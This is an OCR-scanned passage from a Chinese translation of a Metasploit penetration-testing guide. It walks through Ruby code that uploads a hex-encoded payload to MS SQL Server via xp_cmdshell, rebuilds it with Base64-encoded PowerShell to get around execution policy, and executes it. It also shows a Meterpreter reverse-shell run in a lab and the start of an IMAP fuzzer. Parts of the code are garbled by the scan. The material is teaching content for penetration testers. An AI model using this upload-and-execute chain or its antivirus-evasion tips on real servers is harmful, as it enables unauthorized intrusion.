个渗透攻击模块后，当我们在MSF终端中指定我们使用的攻击载荷，它将根据Msf:：
191
---
## Page 219
Metasploit渗透测试指南
Util:EXE.to_win32pe(framework,payload.encoded)的选项配置自动为我们产生一个可用的攻击载
荷二进制程序。
13.3.3编写powershell_upload_exec函数
现在我们来打开之前查看过的Metasploit核心库中的mssql.rb文件，并准备做些修改。我
们先得找到增加powershell_upload_exec函数的位置。
root@bt:/opt/framework3/msf3#nano1ib/msf/core/exploit/mssql.rb
在你的Metasploit中，可以搜索“PowerShell”，应该可以在mssql.rb文件中看到如下引用
的代码，你可以将这些代码从文件中删除，让我们重头开始添加这段代码。
#
# Upload and execute a Windows binary through MS SQL queries and PowerShell
Odefpowershell_upload_exec(exe,debug=false)
#hex converter
Ohex=exe.unpack("H*")[o]
# create random alpha 8 character names
③var_payload=rand_text_alpha(8)
Oprint_status("Warning: This module will leave #{var_payload}.exe in the SQL
Server%TEMP%directory")
你可以看到我们对powershell_upload_exec函数的定义O，该函数包括exe和debug模式两
个参数，exe参数是我们之前以及提到的从原始代码Msf::Util::EXE.to_win32pe（frame
work,payload.encoded)中发送过来的二进制执行文件，而debug参数默认设置为false，表示我们
不会看到任何debug信息，当你需要进行调试分析时可以将其设置为true。
接下来，我们将整个编码之后的二进制程序转换为原始的十六进制描述格式·，这行中的
“H”的意思就是“打开二进制格式的文件，并将其以十六进制描述出来”。
我们创建了一个随机的由八位字母组成的文件名，通常这种随机化文件名可以躲开杀毒
软件的检查。
最后，我们告诉攻击者，攻击载荷程序会保留在目标系统中，在SQL服务的/Temp目录
下。
13.3.4从十六进制转换回二进制程序
下面用PowerShell编写的代码显示了从十六进制格式转换回二进制程序的过程，这段代码
将会被定义为一个字符串变量，并将被上传至目标系统上进行调用。
192
---
## Page 220
第13章编写你自己的模块
# Our payload converter grabs a hex file and converts it to binary through PowerShell
0 h2b ="$s = gc "C:\\Windows\\Temp\#{var_payload}';$s = [string]::Join(**, $s);$s= $s.
Replace（r','');$s=$s.Replace("'n',');$b=new-object byte[]$($s.Length/
[10.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
 h2b_unicode=Rex::Text.to_unicode(h2b)
#base64 encoding allows us to perform execution through powershell without registry changes
h2b_encoded=Rex::Text.encode_base64(h2b_unicode)
print_status("Uploading the payload #{var_payload}，please bepatient...")
一个字节数组，然后将十六进制的Metasploit攻击载荷以二进制方式写入进去（var_payload变
量是通过Metasploit生成的一个随机文件名）。
节的分块，从而将载荷分到多个请求中。但这样进行分割的一个副作用是在传输到目标系统后
文件中将会被添加一些回车换行符（CRLF），而这些回车换行符需要被去除。我们增加了恰当
地处理这些回车换行符的代码?，如果我们不将这些回车换行符删除，那我们最终生成的二进
制程序将是损坏的，不能正确地执行。注意在这里，我们仅仅通过简单地在Ss变量中将r和n
替换为空字符，就可以高效地去除了回车换行符。
一旦这些回车换行符被去除之后，通过对十六进制的Metasploit攻击载荷调用
Convert:ToByte，我们让PowerShell将十六进制格式的文件转换并写入到一个文件名为
#{var_payload}.exe的二进制程序中。在写完要执行的h2b脚本之后，我们以一种PowerShell编
程语言所支持的命令编码方式来对这段脚本进行编码，编码后的命令允许我们能够在一行中执
行很长的脚本代码。
我们首先将h2b字符串转换为Unicode编码方式③，然后进一步将Unicode字符串进行
Base64编码，这时我们可以将-EncodedCommand标志位传递给PowerShell，以绕过通常情况
下存在的执行限制。执行限制策略不允许那些未被信任的脚本被执行，这对于保护用户防止随
PowerShell代码，最终也无法攻陷目标系统。对命令进行编码使得我们能够无需担忧执行限制
策略，并可以在一条命令中添加很多代码内容。
h
在我们指定了h2b字符串和编码命令标志位后，我们能够让PowerShell命令以一种正确的
编码方式，在一个不被限制的环境中执行我们的PowerShell代码。
193
---
## Page 221
Metasploit渗透测试指南
在位置③，将字符串转换为Unicode编码，这是将参数和信息传递给PowerShell的基本要
求。h2b_encoded=Rex::Text.encoded_base64(h2b_unicode)语句将字符串进一步转换为Base64编
码，传递给MSSQL。Base64是EncodedCommand标志位所需采用的编码方式。我们首先将字
符串转换为Unicode，然后再以Base64编码，最终才是PowerShell命令的所需格式。最后，我
们向终端输出一条信息，表明正在上传攻击载荷。
13.3.5计数器
计数器帮助你跟踪文件的当前位置，并让你清楚程序已经读取到了多少数据。在后面的代
码中，一个基础计数器idx最初设置为0，用来标识文件的末尾，并在每次传送十六进制格式文
件到操作系统时递增500字节，简单来说：这个计数器是用来“读取500字节，然后发送，再
读取500字节，再发送”，直到它读取到文件末尾。
0idx=0
cnt=500
③while(idx>%TEMP%\\#{var_payload}"，false)
idx += cnt
end
mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}",debug)
mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}",debug)
print_status("Executing the payload...")
mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false,{:timeout => 1})
print_status("Be sure to cleanup #{var_payload}.exe...")
end
回忆下我们要将攻击负荷发送至目标操作系统，需要将其分割成500字节的分块，我们
使用计数器idx0和cnt?来跟踪攻击负荷是如何被切分的，计数器idx每次增长cnt（500）个字
节，从Metasploit攻击载荷每次读取500字节③，并发送十六进制格式的内容到目标系统上，
直到idx计数器达到与攻击载荷长度，即文件末尾。
我们看到一条消息O，说明攻击载荷已经被使用-EncodedCommandPowerShell命令进行转
换，从普通的PowerShell命令转换为Base64编码方式，然后传输到了目标系统上。
PowerShell命令，将十六进制的载荷转换回二进制代码，写入目标系统的文件系统上，最后进
行执行。
194
---
## Page 222
第13章编写你自己的模块
以下是整个mssql.rb文件的全部代码：
def powershell_upload_exec(exe,debug=false)
#hex converter
hex = exe.unpack("H*")[0]
# create random alpha 8 character names
#var_bypass =rand_text_alpha(8)
var_payload=rand_text_alpha(8)
print_status("Warning: This module will leave #{var_payload}.exe in the SQL
Server %TEMP% directory")
# our payload converter,grabs a hex file and converts it to binary for us through
powershell
h2b ="$s = gc‘C:\\Windows\\Temp\#{var_payload}';$s =[string]:：Join("', $s);$s
.Length/2);o..$($b.Length-1) | %{$b[$_]=[Convert]::ToByte($s.Substring
（$($_*2),2),16)};[I0.File]::WriteAllBytes（'C:\\Windows\\Temp\\#{var_payload}
.exe',$b)"
h2b_unicode=Rex::Text.to_unicode(h2b)
#base64 encode it，this allows us to perform execution through powershell without
registry changes
h2b_encoded =Rex::Text.encode_base64(h2b_unicode)
print_status("Uploading the payload #{var_payload), please be patient...")
idx = 0
cnt=500
while(idx>%TEMP%\\#{var_payload}", false)
idx += cnt
end
print_status("Converting the payloadutilizingPowerShellEncodedCommand...")
mssql_xpcmdshell("cmd.exe /c del %TEMP%\#{var_payload)",debug)
print_status("Executing the payload...")
mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false,{:timeout => 1})
print_status("Be sure to cleanup #{var_payload}.exe...")
end
13.3.6运行渗透攻击模块
当我们完成mssql_powershell.rb和mssql.rb上的编码工作之后，我们可以通过Metasploit
框架和MSF终端来运行这个渗透攻击模块，在此之前，我们需要确认目标靶机环境上已经安装
了PowerShell。现在我们可以通过运行如下的命令来执行我们最新编写的渗透攻击模块：
msf >use windows/mssql/mssql_powershell
msfexploit(mssql_powershell)>set payloadwindows/meterpreter/reverse_tcp
payload=>windows/meterpreter/reverse_tcp
msf exploit(mssql_powershell) > set LHoST 172.16.32.129
LHOST => 172.16.32.129
msf exploit(mssql_powershell) > set RHoST 172.16.32.136
195
---
## Page 223
Metasploit渗透测试指南
RHOST => 172.16.32.136
msf exploit(mssql_powershell) > exploit
[*]Startedreversehandler on172.16.32.129:4444
[*]Warning:This module willleave CztBAnfG.exe in the SQL Server %TEMP% directory
[*] Uploading the payload CztBAnfG, please be patient...
[*]Convertingthepayload utilizingPowerShellEncodedCommand..
[*]Executingthepayload...
[*] Sending stage (748032 bytes) to 172.16.32.136
[*]Be sure tocleanup CztBAnfG.exe...
[*] Meterpreter session 1 opened (172.16.32.129:4444 -> 172.16.32.136:49164) at 2010-05-17
16:12:19 -0400
meterpreter>
13.4小结：代码重用的能量
充分利用现有代码，拿过来改改，并增加一些原创代码这样的流程是我们可以在Metasploit
框架中可以做的最具能量的事情。只要你对Metasploit 框架有了一些感觉，并已经看到了现有
代码是如何工作的，那在大多数情况下，你没有必要完全从零开始来编写你自已的模块代码。本
章介绍的案例是专门为你而设计的，但你还得多看看其他的Metasploit模块源码，了解它们在
做什么以及如何做到的，这样的实践对提升你对Metasploit的认识了解以及渗透测试能力都非
常有帮助。在第14章你将开始学习缓冲区溢出的基础知识，以及如何实现它们。请注意这些代
码是如何组织以及如何工作的，然后你就可以编写出完全属于你自己的渗透代码了。如果你还
不熟悉Ruby编程语言，或者阅读本章还是有一点点难度的话，请找一本Ruby的书进行阅读和
学习。当然，学习如何编写这类模块的开发技术，最佳方法还是要通过实际的编程和调试。
196
---
## Page 224
墨章
创建你自己的渗透攻击模块
作为一名渗透测试者，你将频繁地遇到需要攻击某些应用程序，然而在Metasploit中却没
有相应渗透攻击模块的情况。这时，你可以尝试自己来发掘这些应用程序中的漏洞，并为它们
编写属于你自己的渗透代码。
发掘漏洞的一-种最为简单高效的技术就是对应用程序进行Fuzz测试。Fuzz测试就是将--
些无效的、非预期的、畸形的随机化数据输入到目标应用程序中，然后监测它是否出现诸如崩
溃等异常行为。如果能够通过分析异常发现安全漏洞，你就可以进一步为其开发一个渗透攻击
模块。Fuzz测试技术是一个广阔的话题，而且已经有好多书都在专注地介绍这种技术。在这里
我们仅仅介绍一点Fuzz测试技术的皮毛，然后就进入到如何编写一个可以工作的渗透攻击模块。
在本章中，我们将带领你一起经历一下利用Fuzz测试发现漏洞然后编写渗透代码的过程，
我们将使用一个在NetWinSurgeMail3.8k4-4ru软件中由MatteoMemelli（ryujin)所发现的已公布
漏洞作为案例，该漏洞的概念验证性渗透代码也可以从http://www.exploit-db.com/exploits/5259/
获取到。这个应用软件对超长的LIST命令处理不当存在漏洞，可以导致堆栈溢出并使得攻击
者可以远程执行代码。
---
## Page 225
Metasploit渗透测试指南
提示：本章假设你已经熟悉渗透代码开发，并清楚缓冲区溢出攻击中的一些常用概念，
以及会使用调试器。如果你还需要“温故而知新”，你可以在渗透测试代码库网站
（http://www.exploit-db.com/）中找到一些由corelanc0d3r编写的非常优秀的教程。至少你应阅
读“渗透代码编写教程第一部分：堆栈溢出”（http://www.exploit-db.com/download_pdf/135
35/，中文译稿请参考看雪论坛http://bbs.pediy.com/showthread.php?p=713035#post713035）和
“渗透代码编写教程第三部分：SEH”(http://www.exploit-db.com/download_pdf/13537/，中文
译稿请参考看雪论坛http://bbs.pediy.com/showthread.php?t=102040)。
14.1Fuzz测试的艺术
在你开发任何的渗透代码之前，你需要确认在一个应用软件中是否存在安全漏洞，这个过
程就需要使用Fuzz测试技术。
下面显示了一个简单的IMAP协议Fuzz测试器的源代码，你可以将其保存在你的
/root/msf3/modules/auxiliary/fuzzers/目录下，但需要确认不要将你的测试模块和Metasploit的主
干代码混在一块。
require'msf/core'
class Metasploit3'Simple IMAP Fuzzer'
'Description'
}b% MSF_LICENSE,
'Version'
=>‘$Revision:1 $'
end
def fuzz_str()
③return Rex::Text.rand_text_alphanumeric(rand(1024))
end
def run()
srand(o)
while (true)
①connected = connect_login()
if not connected
print_status("Host is not responding - this is GooD ;)")
break
end
print_status("Generating fuzzed data...")
fuzzed = fuzz_str()
print_status("Sending fuzzed data, buffer length = %d" % fuzzed.length)
req ='ooO2 LIST （)"/" + fuzzed +'" "pWNED"'+"\r\n"
print_status(req)
198
---
## Page 226
第14章创建你自己的渗透攻击模块
res =raw_send_recv(req)
if !res.nil?
print_status(res)
else
print_status("Server crashed,no response")